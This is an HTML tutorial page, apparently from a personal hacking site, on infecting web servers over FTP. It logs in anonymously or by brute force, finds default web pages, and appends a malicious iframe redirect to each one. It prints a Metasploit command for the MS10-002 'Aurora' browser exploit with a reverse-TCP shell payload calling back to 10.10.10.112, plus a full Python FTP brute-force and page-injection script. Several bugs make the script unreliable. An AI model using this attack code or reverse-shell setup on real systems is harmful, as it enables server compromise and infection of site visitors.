<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Injecting malicious file using FTP Protocol</title>
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="all,follow">
    <link rel="stylesheet" href="../../../vendor/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../../vendor/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="../../../https://fonts.googleapis.com/css?family=Roboto+Slab:400,700%7CRoboto:400,700,300">
    <link rel="stylesheet" href="../../../vendor/owl.carousel/assets/owl.carousel.css">
    <link rel="stylesheet" href="../../../vendor/owl.carousel/assets/owl.theme.default.css">
    <link rel="stylesheet" href="../../../vendor/animate.css/animate.css">
    <link rel="stylesheet" href="../../../css/style.default.css" id="theme-stylesheet">
    <link rel="stylesheet" href="../../../css/custom.css">
    <link rel="shortcut icon" href="../../../img/favicon.png">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" 
	integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
	<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" 
	integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" 
integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" 
integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<link href="https://fonts.googleapis.com/css?family=Oswald" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Dosis|Oswald" rel="stylesheet">
    <!-- Tweaks for older IEs--><!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
        <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script><![endif]-->
  </head>
  <body>
    <!-- Reference item-->
    <!-- navbar-->
    <header class="header" >
      <nav class="navbar navbar-expand-lg fixed-top">
        <div class="container"><a href="#intro" class="navbar-brand scrollTo">Killer</a>
          <button type="button" data-toggle="collapse" data-target="#navbarcollapse" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right"><span class="fa fa-bars"></span></button>
          <div id="navbarcollapse" class="collapse navbar-collapse">
            <ul class="navbar-nav ml-auto">
              <li class="nav-item"><a href="../../../index.html" class="nav-link link-scroll">Intro</a></li>
              <li class="nav-item"><a href="../../../index.html" class="nav-link link-scroll">About</a></li>
              <li class="nav-item"><a href="../../../index.html" class="nav-link link-scroll">Services</a></li>
              <li class="nav-item"><a href="../../../index.html" class="nav-link link-scroll">My work</a></li>
              <li class="nav-item"><a href="../../../index.html" class="nav-link link-scroll">Contact</a></li>
            </ul>
          </div>
        </div>
      </nav>
    </header>
    <!-- Intro Image-->
	<section>
      <div class="about container" style="padding-top:30px;font-family: 'Oswald', sans-serif;font-size:120%;">
  <h1>Injecting malicious file using FTP Protocol</h1>
  <div class="line" style="height:2px;width:100%;background:red;margin:5px;"></div>
  <p style="font-family: 'Dosis', sans-serif;font-size:120%;">
   <img src="main.png" style="float:right" class="img-fluid">
  The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of computer files between a client
  and server on a computer network.

FTP is built on a client-server model architecture and uses separate control and data connections between the client and the server.
 FTP users may authenticate themselves with a clear-text sign-in protocol, normally in the form of a username and password, 
 but can connect anonymously if the server is configured to allow it. For secure transmission that protects the username and password, 
and encrypts the content, FTP is often secured with SSL/TLS (FTPS) or replaced with SSH File Transfer Protocol (SFTP).</p>
 
<p><strong>In this module we are going to inject virus file into web server using ftp protocol.<br></p>
Having an idea on below topics would help you for better understanding.<br></strong>
<p>*Python  &nbsp;&nbsp;   *optparse module &nbsp; &nbsp;*ftplib module </p>

<h3>Execution:</h3>
  <div class="line" style="height:2px;width:100%;background:red;margin:5px;"></div>
<p>We will use the Python ftplib pxssh module to connect to the ftp Server.After a sucessful connection we will inject the malicious file.<br><br>
Learn about FTPlib module: <a href="https://docs.python.org/2/library/ftplib.html">Official Documentation</a><br>
Learn about optparse module: <a href="https://docs.python.org/2/library/optparse.html">Official Documentation</a>

<!--We will implement many other modules:<br>
* Os module<br>
* sys module<br>
* colorama module--><br>
</p>

<p>The malicious file can be created by using metasploit framework.</p>
<p>We gonna try to login to ftp using anonymous method,If not succeded we'll try bruteforce to login.
With credentials on the FTP server, we must now test if the server also provides
web access. In order to test this, we will first list the contents of the FTP server’s
directory and search for default web pages. The function returnDefault() takes
an FTP connection as the input and returns an array of default pages it finds.
It does this by issuing the command NLST, which lists the directory contents.
The function checks each file returned by NLST against default web page file
names. It also appends any discovered default pages to an array called retList.
After completing the iteration of these files, the function returns this array.<br><br>

Now that we have found web page files, we must infect them with a malicious
redirect. We will use the Metasploit framework in order to quickly create a
malicious server and page hosted at http://10.10.10.112:8080/exploit. Notice
we choose the exploit ms10_002_aurora, the very same exploit used during
Operation Aurora against Google. The page at 10.10.10.112:8080/exploit will
exploit redirected victims, which will provide a call back to our command and
control server.<br><br>
attacker# msfcli exploit/windows/browser/ms10_002_aurora 
<br>LHOST=10.10.10.112 SRVHOST=10.10.10.112 URIPATH=/exploit 
<br>PAYLOAD=windows/shell/reverse_tcp LHOST=10.10.10.112 LPORT=443 
[*] Please wait while we load the module tree...<br>
<...SNIPPED...><br>
LHOST => 10.10.10.112<br>
SRVHOST => 10.10.10.112<br>
URIPATH => /exploit<br>
PAYLOAD => windows/shell/reverse_tcp<br>
LHOST => 10.10.10.112<br>
LPORT => 443<br>
[*] Exploit running as background job.<br>
[*] Started reverse handler on 10.10.10.112:443<br>
[*] Using URL:http://10.10.10.112:8080/exploit<br>
[*] Server started.<br>
msf exploit(ms10_002_aurora) ><br><br>
Any vulnerable client that connects to our server at http://10.10.10.112:8080/
exploit will now fall prey to our exploit. If it succeeds, it will create a reverse
TCP shell and grant us access to the Windows command prompt on the infected client. From the command shell, we can now execute commands as
the administrator of the infected victim.<br>
The function injectPage() takes an
FTP connection, a page name, and a redirect iframe string as the input. It then
downloads a temporary copy of that page. Next, it appends the iframe redirect
to our malicious server to that temporary file. Finally, the function uploads the
infected page back to the benign server.</p>

<h3 style="padding:10px;">Code:<h3>
  <div class="line" style="height:2px;width:100%;background:red;margin:5px;"></div>
<p style="font-size:80%;padding:10px;font-family:'Dosis',sans-serif;"> 
import ftplib<br>
import optparse<br><br>

def anonLogin(hostname):<br>
	try:<br>
		ftp = ftplib.FTP(hostname)<br>
		ftp.login('anonymous', 'me@your.com')<br>
		print '\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded.'<br>
		ftp.quit()<br>
		return True<br>
	except Exception, e:<br>
		print '\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.'<br>
		return False<br><br>
			
def bruteLogin(hostname,passwdFile):<br><br>
	
	pF=open(passwdFile,'r')<br><br>

	for line in pF.readlines():<br>
		username=pF.split(':')[0]<br>
		password=pF.split(':')[1].strip('\n')<br>
		print "[+] Trying "+ username + password<br>
	try:<br>
		ftp=ftplib.FTP(hostname)<br>
		ftplib.login(username,password)<br>
		print "\n[+]" + str(hostname) + "Anonymous Logon Succeeded: " + username + password<br>
		ftplib.quit()<br>
		return (username,password)<br><br>


	except Exception,e:<br>
		pass<br>
	print "[-] Could not bruteforce FTP Credentials"<br>
	return (none,none)<br><br>

def returnDefault(ftp):<br><br>
	
	try:<br>
		dirList=ftp.nlst()<br>
	except:<br>
		dirList=[]<br>
		print "[-] Could not list Directory contents"<br>
		print "[-] Skipping to next Target"<br>
		return<br>
	retList=[]<br><br>
	
	for filename in dirList:<br>
		fn=filename.lower()<br><br>
		
		if '.php' in fn or '.html' in fn or '.asp' in fn:<br>
			print "[+]Found Default Page: "+filename<br>
			retList.append(filename)<br><br>

def injectPage(ftp,page,redirect):<br>
	f=open(page + '.tmp','w')<br>
	ftp.retrlines('RETR'+ page,f.write)<br>
	print "[+]Downloaded Page:" + page<br>
	f.write(redirect)<br>
	f.close()<br>
	print "[+]Injected Malicious Frame on:" +page<br>
	ftp.storelines('STOR'+ page,open(page+ '.tmp'))<br>
	print "[+]Uploaded Injected Page:" +page<br><br>
	
def attack(username,password,tgthost,tgtredirect):<br>
	ftp=ftplib.FTP(tgthost)<br>
	ftp.login(username,password)<br>
	defPages=returnDefault(ftp)<br>
	for page in defPages:<br>
		injectPage(ftp,page,redirect)<br><br>

def main():<br>
	parser=optparse.OptionParser('usage%prog -H<targer Host[s] -r<redirect page> -f<user pass file>')<br>
	parser.add_option('-H', dest='tgtHosts', type="string", help="Specify target host")<br>
	parser.add_option('-r', dest='redirect', type='string', help="Specify a redirect page")<br>
	parser.add_option('-f', dest='passwdFile', type='string', help="Specify password file")<br>
	(options,args)=parser.parse_args()<br><br>

	tgtHosts=str(options.tgtHosts).split(' , ')<br>
	redirect=options.redirect<br>
	passwdFile=options.passwdFile<br><br>

	if tgtHosts == None or redirect == None or passwdFile == None:<br>
		print parser.usage<br>
		exit(0)<br>

	for tgthost in tgtHosts:<br>
		username=None<br>
		password=None<br>
		if anonLogin(tgthost)==True:<br>
			username="anonymous"<br>
			password="me@your.com"<br>
			print "[+]Using Anonymous Login to attack"<br>
			attack(username,password,tgthost,redirect)<br>
		
		elif passwdFile!=None:<br><br>
			(username,password)=bruteLogin(tgthost,passwdFile)<br><br>
	
		if password!= None:<br>
			print "[+]Using Credintials:" + username  +'/'+ password +'to attack.'<br>
			attack(username,password,tgthost,redirect)<br><br>

main()			


</p>
<h2> <strong>We Sucessfully injected malicious file to a web server</strong> </h2>

<p><!-- AddToAny BEGIN -->
<div class="a2a_kit a2a_kit_size_32 a2a_default_style">
<a class="a2a_dd" href="https://www.addtoany.com/share"></a>
<a class="a2a_button_facebook"></a>
<a class="a2a_button_twitter"></a>
<a class="a2a_button_google_plus"></a>
</div>
<script async src="https://static.addtoany.com/menu/page.js"></script>
<!-- AddToAny END --></p>
  </div>
    </section>
    <!-- About-->
   
   
    <footer class="main-footer" style="background:black;padding-bottom:0px;" id="contact">
      <div class="container">
        <div class="row">
          <div class="col-md-12 text-center ">
            <p class="social">
			<a href="https://www.facebook.com/sanjaisanath" class="external facebook wow fadeInUp"><i class="fa fa-facebook"></i></a>
			<a href="https://www.instagram.com/im._.killer/" data-wow-delay="0.2s" class="external instagram wow fadeInUp"><i class="fa fa-instagram"></i></a>
			<a href="https://plus.google.com/u/0/113662217392024101810" data-wow-delay="0.4s" class="external gplus wow fadeInUp"><i class="fa fa-google-plus"></i></a>
			<a href="https://github.com/Killer2499" data-wow-delay="0.6s" class="email wow fadeInUp"><i class="fa fa-github"></i></a>
			</p>
          </div>
          <!-- /.6-->
		  <div class="col-md-12 text-center" style="padding:20px;">
		  <p style="font-size:200%">The silent you become,the more you are able to hear</p>
           </div>
          <div class="col-md-12 text-center  mt-4 mt-lg-0">
            <p>© 2018 Sanath. All rights reserved.</p>
          </div>
          <div class="col-12 mt-4">
            <p class="template-bootstrapious" style="color:black">Designed by <a href="https://www.bootstrapious.com"><style color='black'>Bootstrapious</style></a>
              <!-- Please do not remove the backlink to us unless you support further theme's development at https://bootstrapious.com/donate. It is part of the license conditions. Thank you for understanding :)-->
            </p>
          </div>
        </div>
      </div>
    </footer>
    <!--<button type="button" data-toggle="collapse" data-target="#style-switch" id="style-switch-button" class="btn btn-primary btn-sm hidden-xs hidden-sm"><i class="fa fa-cog fa-2x"></i></button>-->
    <div id="style-switch" class="collapse">
      <h4 class="text-uppercase">Select theme colour</h4>
      <form class="mb-3">
        <select name="colour" id="colour" class="form-control">
          <option value="">select colour variant</option>
          <option value="default">turquoise</option>
          <option value="red">red</option>
          <option value="pink">pink</option>
          <option value="green">green</option>
          <option value="violet">violet</option>
          <option value="sea">sea</option>
          <option value="blue">blue</option>
        </select>
      </form>
      <p><img src="img/template-mac.png" alt="" class="img-fluid"></p>
      <p class="text-muted text-small">Stylesheet switching is done via JavaScript and can cause a blink while page loads. This will not happen in your production code.</p>
    </div>
    <!-- JavaScript files-->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/popper.js/umd/popper.min.js"> </script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script src="vendor/jquery.cookie/jquery.cookie.js"> </script>
    <script src="vendor/owl.carousel/owl.carousel.min.js"></script>
    <script src="vendor/waypoints/lib/jquery.waypoints.min.js"></script>
    <script src="vendor/jquery.counterup/jquery.counterup.js"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBu5nZKbeK-WHQ70oqOWo-_4VmwOwKP9YQ"></script>
    <script src="js/front.js"></script>
  </body>
</html>
